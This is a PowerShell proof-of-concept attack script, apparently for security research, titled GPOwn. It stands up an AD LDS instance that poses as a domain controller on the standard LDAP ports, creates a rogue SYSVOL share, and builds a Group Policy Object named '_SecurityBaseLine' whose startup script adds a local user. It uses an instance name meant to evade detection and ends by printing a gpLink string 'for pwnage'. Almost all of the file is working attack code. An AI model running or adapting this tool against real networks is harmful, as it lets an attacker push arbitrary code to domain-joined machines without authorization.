<#  
.SYNOPSIS  
    PoC for PGOwn. Script Only works for servers due to use of powershell via the ADWS. can be rewritten to run on workstations   
.DESCRIPTION  
    Installs AD/LDS role, creates instace, configures the instance to act like a DC serving up a GPO.  The GPO is a machine startup script. 
.NOTES  
    File Name  : GPOwn.ps1  
    Author     : Mark R. Gamache  - mark@markgamache.com  - @markGamacheNerd  
    Requires   : UNK.  Computers I guess  
    
  

#>

Function Get-RootDSE
{
	Param (
		[parameter(Mandatory = $false)]
		[String]#LDAP server name
		#Default: closest DC
		$LdapServer = [String]::Empty,
		[parameter(Mandatory = $false)]
		[Int32]#LDAP server port#Default: 389
		$Port = 389,
		[parameter(Mandatory = $false)]
		[System.DirectoryServices.Protocols.LdapConnection]#existing LDAPConnection object.
		#When we perform many searches, it is more effective to use the same conbnection rather than create new connection for each search request.
		#Default: $null, which means that connection is created automatically using information in LdapServer and Port parameters
		$LdapConnection
		
	)
	
	Process
	{
				
		try
		{
					
			$LdapConnection = new-object System.DirectoryServices.Protocols.LdapConnection(new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($LdapServer, $Port))
			$LdapConnection.AuthType = 'Basic'
									
			$propDef = @{ "configurationNamingContext" = @(); "schemaNamingContext" = @(); "namingContexts" = @() }

			#build request
			$rq = new-object System.DirectoryServices.Protocols.SearchRequest
			$rq.DistinguishedName = $null
			$rq.Filter = "objectclass=*"
			$rq.Scope = "Base"
			$rq.Attributes.AddRange($propDef.Keys) | Out-Null
			$rq.TimeLimit = New-Object System.TimeSpan(0,0,4);
			$rsp = $LdapConnection.SendRequest($rq)
			$data = new-object PSObject -Property $propDef
			$data.configurationNamingContext = (($rsp.Entries[0].Attributes["configurationNamingContext"].GetValues([string]))[0]) #.Split(';')[1];
			$data.schemaNamingContext = (($rsp.Entries[0].Attributes["schemaNamingContext"].GetValues([string]))[0]) #.Split(';')[1];
			$data.namingContexts  = ($rsp.Entries[0].Attributes["namingContexts"].GetValues([string])) #.Split(';')[2];
			$LdapConnection.Dispose()
			return $data


		}
		catch
		{
			Write-Error $Error[0]
			return $false
		}
		
	}
}


function install 
{
	
	Begin
	{	
	if($operation -eq "UniqueInstall") 
		{ 	$NewApplicationPartitionToCreate = $Partition } 
	elseif($operation -eq "ReplicaInstall")
		{ 
		# replica
			$ApplicationPartitionsToReplicate = $Partition 
			
			$nfFound = $false

			#check if the source LDAP is up and holds the naming context we want
			$NCList = Get-RootDSE -LdapServer $SourceServer -Port $SourceLDAPPort
			if($NCList -eq $false)
			{
				#could not connect and should see error in the get-rootdces func
				$false
				exit
			}
			foreach($nc in $NCList.namingContexts)
			{
				if(!($Partition))
				{
					$nfFound = $True
					break
				}

				if($Partition.ToLower() -eq $nc.ToLower())
				{
					#Write-Information "Source good"
					$nfFound = $True
					break
				}
			}


			if($nfFound  )
			{
				#source good
				#Write-Error "`r`nSource good"
			}
			else
			{
				Write-Error "`r`nYour replica source, $SourceServer : $SourceLDAPPort is is up but does not contain the partition $Partition "

				 $false
				exit
			}
		}
	
	#validate the admin user or group exists
		if($Administrator)
		{
			if($Administrator -like "*@*")
			{
				$parts = $Administrator.Split("@")
				$prin = $parts[0]
				$domain = $parts[1]
		
			}
			elseif ($Administrator -like "*\*")
			{
				$parts = $Administrator.Split("\\")
				$prin = $parts[1]
				$domain = $parts[0]
		
			}
			else
			{
				#local domain 
				$domain = $Env:USERDNSDOMAIN
				$prin = $Administrator
			}

			if(verifyPrincipal -userOrGroup $prin -theDomain $domain)
			{
				#echo woo1
			}
		}
		
	
	

	#verify the service account name	
	if($ServiceAccount)
	{
		if(!($ServicePassword))
		{
			Write-Error "`r`nYou entered a service account but no password.`r`nGood day!"
			 $false
			exit
		}
		if ($ServiceAccount -like "*\*")
			{
				$partsSvc = $ServiceAccount.Split("\\")
				$svcprin = $partsSvc[1]
				$svcdomain = $partsSvc[0]
				if(verifyPrincipal -userOrGroup $svcprin -theDomain $svcdomain)
				{
					#Write-Error "`r`nService account exists"
				}
		
			}
			else
			{
				Write-Error "`r`nService account must be in domain\user format.  You entered $ServiceAccount.`r`nGood day!! "
				 $false
				exit
			}
	}
	else
	{
		Write-Host "No service account used. Running as network service" 
	}
	

	
	if(-not $LocalLDAPPortToListenOn -and -not($LocalSSLPortToListenOn))
	{
		$LocalLDAPPortToListenOn = "5389"
		$LocalSSLPortToListenOn = "5636" 
		
	}
	
}

	Process
	{
	# fun times
	[string] $theText = [string]::Empty
	if($operation -eq "UniqueInstall")
	{
		$instTy = "Unique"
	}
	else
	{
		$instTy = "Replica"
	}
	
	$theText+= "[ADAMInstall]`r`nInstallType=$instTy`r`n"
	$theText+= "AddPermissionsToServiceAccount=Yes`r`n"
	$theText+= "InstanceName=$InstanceName`r`n"
	$theText+= "LocalLDAPPortToListenOn=$LocalLDAPPortToListenOn`r`n"
	$theText+= "LocalSSLPortToListenOn=$LocalSSLPortToListenOn`r`n"
	if($Administrator)
	{
		$theText+= "Administrator=`"$Administrator`"`r`n"
	}
	
	
	if( $DataFilesPath -and $LogFilesPath)
	{
		$theText+= "DataFilesPath=$DataFilesPath`r`n"
		$theText+= "LogFilesPath=$LogFilesPath`r`n"
	}
	
	if($operation -eq "ReplicaInstall")
	{
		if($Partition)
		{
			$theText+= "ApplicationPartitionsToReplicate=`"$Partition`"`r`n"
		}
		
		$theText+= "SourceServer=$SourceServer`r`n"
		$theText+= "SourceLDAPPort=$SourceLDAPPort`r`n"
		$theText+= "SourceUserName=$SourceUserName`r`n"
		$theText+= "SourcePassword=$SourcePassword`r`n"
        
        
	}
	else
	{
		if($Partition)
		{
			$theText+= "NewApplicationPartitionToCreate=`"$Partition`"`r`n"
		}
	}
	
	#add service account
	if($ServiceAccount)
	{
		$theText+= "ServiceAccount=$ServiceAccount`r`n"
		$theText+= "ServicePassword=$ServicePassword`r`n" 
	}
	
	#add ldifs
	if($ImportLDIFFiles)
		{
			#ImportLDIFFiles="ms-inetorgperson.ldf" "ms-user.ldf"
			[string[]] $schemFiles = $ImportLDIFFiles.Split(',').Trim()
			[string] $schemLine 
			foreach($line in $schemFiles)
			{
				$schemLine += "`"$line`" "
			}
			$theText+= "ImportLDIFFiles= $schemLine`r`n"
		}
	
	#$theText	
	#%systemroot%\ADAM\adaminstall.exe /answer:drive:\<pathname>\<filename>.txt"
	$filepath = "$env:SystemRoot\ADAM\spFun.txt"
	try
	{
		$theText > $filepath
	}
	catch
	{
		Write-Error $Error[0]
		return $false

	}


}#process

	End
	{
		#install!
		
		try
		{
			$theArgs = @("/answer:$env:SystemRoot\ADAM\spFun.txt")
		#	$doIt = Invoke-Expression   "$env:SystemRoot\ADAM\adaminstall.exe"  -ArgumentList $theArgs -PassThru -Wait
			$doIt = Invoke-Expression   "$env:SystemRoot\ADAM\adaminstall.exe /answer:$filepath"
		#	$doIt = Invoke-Command -FilePath   "$env:SystemRoot\ADAM\adaminstall.exe"  -ArgumentList $theArgs 
		 

			if($doIt.length -gt 2)
			{
				$rrrrr = $doIt[$doIt.length -1]
				if($rrrrr -eq "You have successfully completed the Active Directory Lightweight Directory Services Setup Wizard.")
				{
					$delOut = Invoke-Expression   "sdelete $filepath"
					$fileSufix = [guid]::NewGuid().ToString()
					$resFileName =  "$env:SystemRoot\ADAM\installResult" + $fileSufix + ".txt"
					$doIt | Out-File -FilePath $resFileName -ErrorAction Stop
					#$doIt > $resFileName
					return $True
				}
				else
				{
					$rese =	Get-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ADAM_Installer_Results" -name ADAMInstallErrorMessage
					$catfood= $rese.ADAMInstallErrorMessage
					Write-Error "`r`nFailed to install ADAM instance due to $catfood"
				
					return $false
				}
			}

		


		}
		catch
		{
			$fail = $Error[0]
			return $false
			
		}
	}
}

function listInstances
{
	
	[string[]]$thems = (gci -Path HKLM:\SYSTEM\CurrentControlSet\Services\DirectoryServices).PSchildname
	if($thems.Contains("Linkage"))
	{
		#Just a place holder
	}
	else
	{
		return $false
	}
	$instNames = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\DirectoryServices\Linkage -Name Export).Export
	
	[pscustomobject[]]$ints = @()
	#[int]$idx = 0
	foreach($inst in $instNames)
	{
		$stat = (Get-Service $inst).Status
		$funName =  (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$inst).DisplayName
		$ldapPort = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$inst\Parameters)."Port LDAP"
		$SSLPort = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$inst\Parameters)."Port SSL"
		$oneInst = [pscustomobject] @{Name=$funName; Status=$stat; LDAPPort=$ldapPort; SSLPort=$SSLPort}
		#$ints[$idx] = $oneInst
		$ints += ($oneInst)
	}

	#get data about them
	Write-Debug ""
	return $ints

}


function validateInstallSettings
{
	#we do stuff
	[bool]$valid = $True

		#valdate listenint prots
	if($LocalLDAPPortToListenOn -and -not($LocalSSLPortToListenOn))
	{
		Write-Error "`r`nIf you specify -LocalLDAPPortToListenOn , you must specify -LocalSSLPortToListenOn and vice versa "
		 $false
		exit
	}
	
	if($LocalSSLPortToListenOn -and -not($LocalLDAPPortToListenOn))
	{
		Write-Error "`r`nIf you specify -LocalLDAPPortToListenOn , you must specify -LocalSSLPortToListenOn and vice versa "
		
		 $false
		exit
	}
	

	if(!( $InstanceName))
	{
		Write-Error "`r`nAn install needs an InstanceName "
		return $false
		
	}

<#
	if($Operation -eq "UniqueInstall" )
	{
		#
	}
	else
	{
			# demand source server and port
			if( (!($SourceServer)) -or (!($SourceLDAPPort)))
			{
				Write-Error "`r`nReplicas must have a source server and port"
				return $false
				
			}
			
			# demand source user and pwd
			if((!($SourceUserName)) -or (!($SourcePassword)))
			{
				Write-Error "`r`nReplicas must have a source user and password"
				return $false
				
			}

	}
#>

	return $valid
}


#begin script
$InstanceName = "ChangeMeToEvadeDetection"
$bLDSInstalled = $false
$operation = "UniqueInstall"
$features = $null

$domainDNS = ""

$features = Get-WindowsFeature 

if($features -eq $null)
{
    $features = Get-WindowsOptionalFeature -Online -FeatureName DirectoryServices-ADAM-Client
    if($features.State -eq "Disabled")
    {
        Enable-WindowsOptionalFeature -FeatureName DirectoryServices-ADAM-Client -Online
        $features = Get-WindowsOptionalFeature -Online -FeatureName DirectoryServices-ADAM-Client
        if($features.State -eq "Enabled")
        {
            $bLDSInstalled = $true
        }

    }
    else
    {
        $bLDSInstalled = $true
    }
    

}
else
{
    #look for ADLDS
    $adlds =  $features | ? {$_.Name -eq "ADLDS"}
    if($adlds.Installed -eq $true)
    {
        $bLDSInstalled = $true
    }
    else
    {
        $inst = Install-WindowsFeature ADLDS
        if($inst.Success -eq $true)
        {
            $bLDSInstalled = $true
        }
    }

}

if($bLDSInstalled)
{
    ##move on
}
else
{
    #fail 
    Write-Warning "Can't get ADLDS installed"
    return
}


$fqdn = (Get-WmiObject win32_computersystem).DNSHostName+"."+(Get-WmiObject win32_computersystem).Domain
$dnsParts = $fqdn.Split(".")
$newDN = ""
$bSkipOne = $true
foreach($P in $dnsParts)
{
    $newDN = $newDN + "DC=$P,"
    if($bSkipOne)
    {
        $bSkipOne = $false
    }
    else
    {
        $domainDNS =  $domainDNS + $P + "."
    }
}

$newDN = $newDN.Substring(0, $newDN.Length -1)

$domainDNS = $domainDNS.Substring(0, $domainDNS.Length -1)

[string]$Partition = $newDN

[string]$LocalLDAPPortToListenOn = "389"
   

[string]$LocalSSLPortToListenOn = "636"

 
[string]$ImportLDIFFiles = "MS-adamschemaw2k8.LDF"

$bPartSuccess = $false

if(validateInstallSettings)
{
	$happy = install
	if($happy)
	{
		$bPartSuccess = $True
	}
	else
	{
		$bPartSuccess = $false
	}
}
else
{
	$bPartSuccess = $false
}

if($bPartSuccess)
{

    # add authd users to LDS readers role
    $readersDN = "CN=Readers,CN=Roles,"+ $Partition
    $DomCom = "<SID=$((Get-ADGroup "domain computers").SID)>"
    $DomUse = "<SID=$((Get-ADGroup "domain users").SID)>"

    $SIDS = @()
    $SIDS += $DomCom 
    $SIDS += $DomUse
    Set-ADObject -Server localhost -Identity $readersDN -Add @{member=$SIDS}
 
    #SDDL for def securty on GPC objects
    #findSchma and gpC class
    $theRootDSE = $null
    $theRootDSE = Get-RootDSE -LdapServer localhost 
    $sys =  New-ADObject -Server localhost -Path "$newDN" -Name System -Type container -PassThru
    #$sys
    $pol = New-ADObject -Server localhost -Path "$sys" -Name Policies -Type container -PassThru
    #$pol

    #SDDL for allowing apply GPO
    #findSchma and gpo class
    $GPCobj = Get-ADObject -SearchBase $($theRootDSE.schemaNamingContext) -LDAPFilter "(ldapdisplayname=groupPolicyContainer)" -Server localhost
    Set-ADObject -Server localhost -Identity $($GPCobj.DistinguishedName) -Add @{defaultSecurityDescriptor='D:P(A;CI;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOSDRCWDWO;;;EA)(A;CI;CCDCLCSWRPWPDTLOSDRCWDWO;;;CO)(A;CI;CCDCLCSWRPWPDTLOSDRCWDWO;;;SY)(A;CI;LCRPLORC;;;AU)(OA;CI;CR;edacfd8f-ffb3-11d1-b41d-00a0c968f939;;AU)(A;CI;LCRPLORC;;;ED)'}

    $newGUID = "{" + ([guid]::NewGuid()).ToString() + "}"

    md c:\sysvol
    New-SmbShare -Name "SysVol" -Path "C:\sysvol" 

    md c:\Sysvol\$domainDNS

    md c:\Sysvol\$domainDNS\Policies
    md "c:\Sysvol\$domainDNS\Policies\$newGUID"

    md "c:\Sysvol\$domainDNS\Policies\$newGUID\User"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\Startup"
    md "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\Shutdown"


    $gpt = @'
[General]
Version=2
displayName=New Group Policy Object

'@
    Set-Content -Path  "c:\Sysvol\$domainDNS\Policies\$newGUID\GPT.INI" -Value $gpt

    
    $spts = @'

[Startup]
0CmdLine=fun.bat
0Parameters=

'@

    Set-Content -Path  "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\scripts.ini" -Value $spts

    $su = @'
net user pwntest3 /add /active:no

'@
    Set-Content -Path  "c:\Sysvol\$domainDNS\Policies\$newGUID\Machine\Scripts\Startup\fun.bat" -Value $su

    #create teh GPO object

    $gptPath = "\\$fqdn\SysVol\$domainDNS\Policies\$newGUID"


    $thePol = New-ADObject -Server localhost -Path "$($pol.DistinguishedName)" -PassThru -Type groupPolicyContainer -Name "$newGUID" -OtherAttributes @{displayName="_SecurityBaseLine";flags="0";gPCFileSysPath= $gptPath;gPCFunctionalityVersion=2;versionNumber="2";gPCMachineExtensionNames="[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"}
    
    
    #ACL the GPC for apply
       #get acl
    New-PSDrive -Name ADLDS -PSProvider ActiveDirectory -Server localhost -Scope Global -root "//RootDSE/"
    #Set-Location ADFAB:
    $theACLX = Get-Acl -Path "ADLDS:\$($thePol.DistinguishedName)" 


    ##auth'd users
    # apply GPO guid edacfd8f-ffb3-11d1-b41d-00a0c968f939
    $AppGuid = [guid]::Parse("edacfd8f-ffb3-11d1-b41d-00a0c968f939")
    $AuthdUsers = New-Object System.Security.Principal.SecurityIdentifier( "S-1-5-11")
    $adCompsAceX =  New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AuthdUsers, "ExtendedRight", "Allow",$AppGuid )
   # $adCompsAceX =  New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AuthdUsers, "ExtendedRight", "Allow",[System.DirectoryServices.ActiveDirectorySecurityInheritance]::All )
    
    $theACLX.AddAccessRule($adCompsAceX)

    #set acl
    Set-ACL -ACLObject $theACLX -Path "ADLDS:\$($thePol.DistinguishedName)"  -Verbose
    
    
    New-ADObject -Server localhost -Path "$($thePol.DistinguishedName)" -Name User -Type container -PassThru
    New-ADObject -Server localhost -Path "$($thePol.DistinguishedName)" -Name Machine -Type container -PassThru

    echo "Add this entry to a gpLink, for pwnage`r`n [LDAP://$($thePol.DistinguishedName);0]"

}

